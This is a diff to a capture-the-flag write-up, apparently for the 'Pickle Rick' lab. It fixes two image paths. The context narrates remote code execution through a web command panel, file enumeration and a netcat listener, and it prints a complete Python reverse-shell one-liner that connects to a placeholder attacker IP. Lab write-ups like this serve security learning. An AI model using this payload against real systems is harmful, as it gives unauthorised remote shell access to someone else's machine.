@@ -49,7 +49,7 @@ In the words of Bender, "Neat". Looks like we have a command panel that is waiti
 
 Woop, we have remote code execution! Lets get a feel for what is on the machine's backend. How about... listing everything in the current website root directory with `ls`?
 
-![ls](../../../static/writeupimgs/picklerickimgs/s.png)
+![ls](../../../static/writeupimgs/picklerickimgs/ls.png)
 
 Ah, here we see the files that were enumerated from the gobuster scan, but what is this? Two other interesting files that were not found during our enumeration, I wonder what their contents are. There is a command for that, namely the `cat` command.
 > Sup3rS3cretPickl3Ingred.txt and clue.txt
@@ -88,7 +88,7 @@ Turning to [the reverse shell cheatsheet](https://github.com/swisskyrepo/Payload
 
 All hope is lost. No, there is another... language we can use to possible gain a foothold. Ubuntu comes with another language called python, in which there is two versions python2 and python3. Now `which python` does it have? This gives us nothing. How about `which python3`? There it be, python3. Taking a look back to the cheatsheet shows that python can be utilized to gain a reverse shell. First, we set up our netcat listener
 
-![netcat](../../../static/writeupimgs/picklerickimgs/picklerickimgsnetcat.png)
+![netcat](../../../static/writeupimgs/picklerickimgs/picklerickimgs/netcat.png)
 
 Then execute payload `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacking ip>",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 
